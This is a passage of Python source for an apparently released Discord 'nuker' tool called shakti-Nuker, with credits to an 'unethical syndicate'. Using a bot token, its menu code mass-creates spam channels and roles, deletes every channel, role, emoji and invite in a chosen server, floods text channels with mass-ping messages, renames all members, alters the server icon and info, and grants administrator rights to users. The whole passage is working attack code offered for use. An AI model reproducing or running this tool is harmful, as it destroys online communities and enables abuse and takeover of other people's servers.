            tasks = [self.execute_crechannels(random.choice(__config__["nuke"]["channel_names"]), type_, token) for _ in range(amount)]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Created {len(self.channels)}/{amount} channels in ({duration:.2f}s)", 36))
            await asyncio.sleep(5)
            await self.menu()

        elif ans in ["5", "05"]:
            try:
                amount_input = await self.async_input(format_log_message("INFO", "Amount", 50))
                amount = int(amount_input.strip())
                if amount <= 0:
                    raise ValueError
            except ValueError:
                print(format_log_message("ERROR", f"Invalid amount: {gradient_text(amount_input, GOLD_START, BLUE_END, bold=True)}!", 47))
                await self.menu()
                return

            self.roles.clear()
            start_time = time.time()
            tasks = [self.execute_creroles(random.choice(__config__["nuke"]["roles_name"]), token) for _ in range(amount)]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Created {len(self.roles)}/{amount} roles in ({duration:.2f}s)", 40))
            await asyncio.sleep(5)
            await self.menu()

        elif ans in ["6", "06"]:
            async with self.semaphore:
                async with await self._get_session() as session:
                    try:
                        async with session.get(
                            f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                            headers={"Authorization": f"Bot {token}"}
                        ) as response:
                            if response.status == 200:
                                channels = await response.json()
                            else:
                                print(format_log_message("ERROR", "Failed to fetch channels", 39))
                                await self.menu()
                                return
                    except Exception as e:
                        print(format_log_message("ERROR", f"Error fetching channels | {e}", 39))
                        await self.menu()
                        return

            if not channels:
                print(format_log_message("ERROR", "No channels found!", 44))
                await self.menu()
                return

            self.channels.clear()
            start_time = time.time()
            tasks = [self.execute_delchannels(ch['id'], token) for ch in channels]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Deleted {len(self.channels)}/{len(channels)} channels in ({duration:.2f}s)", 36))
            await asyncio.sleep(5)
            await self.menu()

        elif ans in ["7", "07"]:
            async with self.semaphore:
                async with await self._get_session() as session:
                    try:
                        async with session.get(
                            f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                            headers={"Authorization": f"Bot {token}"}
                        ) as response:
                            if response.status == 200:
                                roles = await response.json()
                            else:
                                print(format_log_message("ERROR", "Failed to fetch roles", 42))
                                await self.menu()
                                return
                    except Exception as e:
                        print(format_log_message("ERROR", f"Error fetching roles | {e}", 42))
                        await self.menu()
                        return

            if not roles:
                print(format_log_message("ERROR", "No roles found!", 47))
                await self.menu()
                return

            self.roles.clear()
            start_time = time.time()
            batch_size = 10
            total_roles = len(roles)
            deleted_count = 0
            print(format_log_message("INFO", f"Starting deletion of {total_roles} roles", 35))
            for i in range(0, total_roles, batch_size):
                batch = roles[i:i + batch_size]
                tasks = [self.execute_delroles(role['id'], token) for role in batch]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                deleted_count += sum(1 for result in results if result is True)
                print(format_log_message("INFO", f"Progress: {min(i + batch_size, total_roles)}/{total_roles} roles processed", 29))
                await asyncio.sleep(1.0)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Deleted {deleted_count}/{total_roles} roles in ({duration:.2f}s)", 40))
            await asyncio.sleep(5)
            await self.menu()

        elif ans in ["8", "08"]:
            async with self.semaphore:
                async with await self._get_session() as session:
                    try:
                        async with session.get(
                            f"https://discord.com/api/v10/guilds/{self.guildid}/emojis",
                            headers={"Authorization": f"Bot {token}"}
                        ) as response:
                            if response.status == 200:
                                emojis = await response.json()
                            else:
                                print(format_log_message("ERROR", "Failed to fetch emojis", 41))
                                await self.menu()
                                return
                    except Exception as e:
                        print(format_log_message("ERROR", f"Error fetching emojis | {e}", 41))
                        await self.menu()
                        return

            if not emojis:
                print(format_log_message("ERROR", "No emojis found!", 46))
                await self.menu()
                return

            self.emojis.clear()
            start_time = time.time()
            tasks = [self.execute_delemojis(emoji['id'], token) for emoji in emojis]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Deleted {len(self.emojis)}/{len(emojis)} emojis in ({duration:.2f}s)", 37))
            await asyncio.sleep(5)
            await self.menu()

        elif ans in ["9", "09"]:
            try:
                amount_input = await self.async_input(format_log_message("INFO", "Spam amount", 50))
                amount = int(amount_input.strip())
                if amount <= 0:
                    raise ValueError
            except ValueError:
                print(format_log_message("ERROR", f"Invalid amount: {gradient_text(amount_input, GOLD_START, BLUE_END, bold=True)}!", 47))
                await self.menu()
                return

            async with self.semaphore:
                async with await self._get_session() as session:
                    try:
                        async with session.get(
                            f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                            headers={"Authorization": f"Bot {token}"}
                        ) as response:
                            if response.status == 200:
                                channels = await response.json()
                            else:
                                print(format_log_message("ERROR", "Failed to fetch channels", 39))
                                await self.menu()
                                return
                    except Exception as e:
                        print(format_log_message("ERROR", f"Error fetching channels | {e}", 39))
                        await self.menu()
                        return

            if not channels:
                print(format_log_message("ERROR", "No channels found!", 44))
                await self.menu()
                return

            self.messages.clear()
            self.channels = [ch['id'] for ch in channels if ch['type'] == 0]
            if not self.channels:
                print(format_log_message("ERROR", "No text channels found for spam!", 32))
                await self.menu()
                return

            channel_cycle = cycle(self.channels)
            start_time = time.time()
            tasks = [self.execute_massping(next(channel_cycle), random.choice(__config__["nuke"]["messages_content"]), token) for _ in range(amount)]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Spammed {len(self.messages)}/{amount} messages in ({duration:.2f}s)", 36))
            await asyncio.sleep(5)
            await self.menu()

        elif ans == "10":
            start_time = time.time()
            async with self.semaphore:
                async with await self._get_session() as session:
                    try:
                        async with session.get("https://github.com/notspeezy/shakti-Nuker/releases/latest") as response:
                            is_success = False
                            if response.status == 200:
                                location = response.headers.get('location', '')
                                if '/tag/v' in location:
                                    check_version = location.split('/tag/v')[1].split('-')[0]
                                    if VERSION != check_version:
                                        print(format_log_message("INFO", f"Outdated! Updating to v{check_version}", 35))
                                        webbrowser.open(f"https://github.com/notspeezy/shakti-Nuker/releases/tag/v{check_version}")
                                    else:
                                        print(format_log_message("SUCCESS", f"Up to date: v{VERSION}", 45))
                                        is_success = True
                                else:
                                    print(format_log_message("ERROR", "Could not parse version", 40))
                            else:
                                print(format_log_message("ERROR", "Could not reach GitHub", 41))
                            
                            end_time = time.time()
                            duration = end_time - start_time
                            if is_success:
                                print(format_log_message("SUCCESS", f"Check update completed in ({duration:.2f}s)", 38))
                            else:
                                print(format_log_message("INFO", f"Check update process finished in ({duration:.2f}s)", 36))

                    except Exception as e:
                        print(format_log_message("ERROR", f"Check update error | {e}", 45))
            await asyncio.sleep(5)
            await self.menu()

        elif ans == "11":
            credits = f"""
{format_log_message("INFO", "Credits:", 48)}
- MADE BY BOSS DADDY
- Join Discord server 
 • https://discord.gg/GkmFvDrfjv
 • UNETHICAL SYNDICATE ON TOP 
- Press Enter to return.
            """
            print(credits)
            await self.async_input("")
            await self.menu()

        elif ans == "12":
            new_nick = await self.async_input(format_log_message("INFO", "New nickname", 50))
            new_nick = new_nick.strip()
            if not new_nick:
                print(format_log_message("ERROR", "Nickname cannot be empty!", 37))
                await self.menu()
                return
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
                if not members:
                    print(format_log_message("ERROR", "No members found. Fetch first.", 33))
                    await self.menu()
                    return
            except FileNotFoundError:
                print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
                await self.menu()
                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error reading members | {e}", 41))
                await self.menu()
                return

            start_time = time.time()
            tasks = [self.execute_nick_all(member, new_nick, token) for member in members]
            results = await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            success_count = sum(1 for r in results if r is True)
            print(format_log_message("SUCCESS", f"Attempted to nick {len(members)} members, succeeded {success_count} in ({duration:.2f}s)", 35))
            await asyncio.sleep(5)
            await self.menu()

        elif ans == "13":
            start_time = time.time()
            success = await self.execute_change_icon(token)
            end_time = time.time()
            duration = end_time - start_time
            if success:
                print(format_log_message("SUCCESS", f"Change icon completed in ({duration:.2f}s)", 38))
            else:
                print(format_log_message("INFO", f"Change icon process finished in ({duration:.2f}s)", 36))
            await asyncio.sleep(5)
            await self.menu()

        elif ans == "14":
            start_time = time.time()
            success = await self.execute_change_guild_info(token)
            end_time = time.time()
            duration = end_time - start_time
            if success:
                print(format_log_message("SUCCESS", f"Change guild info completed in ({duration:.2f}s)", 35))
            else:
                print(format_log_message("INFO", f"Change guild info process finished in ({duration:.2f}s)", 33))
            await asyncio.sleep(5)
            await self.menu()

        elif ans == "15":
            success_count, duration = await self.execute_give_admin(token)
            if duration > 0:
                print(format_log_message("SUCCESS", f"Assigned admin to {success_count} users in ({duration:.2f}s)", 36))
            else:
                print(format_log_message("INFO", f"Assign admin process finished in ({duration:.2f}s)", 34))
            await asyncio.sleep(5)
            await self.menu()

        elif ans == "16":
            deleted_count, duration, total_invites = await self.execute_delete_invites(token)
            if duration > 0 or total_invites > 0:
                print(format_log_message("SUCCESS", f"Deleted {deleted_count}/{total_invites} invites in ({duration:.2f}s)", 44))
            else:
                print(format_log_message("INFO", f"Delete invites process finished in ({duration:.2f}s)", 42))
            await asyncio.sleep(5)
            await self.menu()

        elif ans == "17":
            print(format_log_message("INFO", "Switching guild...", 45))
            guildid = await self.async_input(format_log_message("INFO", "Enter new Guild ID", 50))
            guildid = guildid.strip()
            os.system("cls") if os.name == "nt" else os.system("clear")
            await shakti(guildid, self.client).menu()
            os._exit(0)

        elif ans == "18":
            print(format_log_message("SUCCESS", "Exiting...", 50))
            os._exit(0)

        else:
            print(format_log_message("ERROR", f"Invalid option: {gradient_text(ans, GOLD_START, BLUE_END, bold=True)}!", 47))
            await self.menu()

@__client__.event
async def on_ready():
    os.system("cls") if os.name == "nt" else os.system("clear")
    print(format_log_message("SUCCESS", f"Authenticated: {__client__.user.name}#{__client__.user.discriminator}", 24))

    guildid = ""
    fetch_guilds_choice = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Fetch and list available guilds? [y/n]", 50)))
    fetch_guilds_choice = fetch_guilds_choice.strip().lower()

    if fetch_guilds_choice == 'y' and __client__.guilds:
        print(format_log_message("INFO", "Available Guilds:", 50))
        print(gradient_text("╭" + "─" * 140 + "╮", GOLD_START, BLUE_END, bold=True))
        for i, guild in enumerate(__client__.guilds):
            print(gradient_text(f"│ {i+1:>3} │ {guild.name:<104} │ ID: {guild.id:<20} │", GOLD_START, BLUE_END, bold=True))
        print(gradient_text("╰" + "─" * 140 + "╯", GOLD_START, BLUE_END, bold=True))
        
        try:
            choice = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Choose guild number (or Enter for manual ID)", 50)))
            choice = choice.strip()
            if choice:
                idx = int(choice) - 1
                if 0 <= idx < len(__client__.guilds):
                    guildid = str(__client__.guilds[idx].id)
                    print(format_log_message("SUCCESS", f"Selected: {gradient_text(__client__.guilds[idx].name, GOLD_START, BLUE_END, bold=True)}", 43))
                else:
                    raise ValueError
            else:
                guildid = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Enter Guild ID manually", 50)))
                guildid = guildid.strip()
        except (ValueError, IndexError):
            print(format_log_message("ERROR", "Invalid choice. Falling back to manual ID input.", 28))
            guildid = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Enter Guild ID", 50)))
            guildid = guildid.strip()
    else:
        if fetch_guilds_choice == 'y':
            print(format_log_message("ERROR", "No guilds found! Proceeding to manual ID input.", 28))
        else:
            print(format_log_message("INFO", "Skipping guild list.", 40))
        guildid = await __client__.loop.run_in_executor(None, lambda: input(format_log_message("INFO", "Enter Guild ID", 50)))
        guildid = guildid.strip()

    if not guildid:
        print(format_log_message("ERROR", "No guild ID provided! Exiting.", 32))
        os._exit(1)

    await shakti(guildid, __client__).menu()

if __name__ == "__main__":
    try:
        if os.name == "nt":
            os.system(f"title BOSS DADDY ON TOP")
        __client__.run(token)
    except Exception as e:
        print(format_log_message("ERROR", f"Failed to start | {e}", 47))
        os._exit(1)
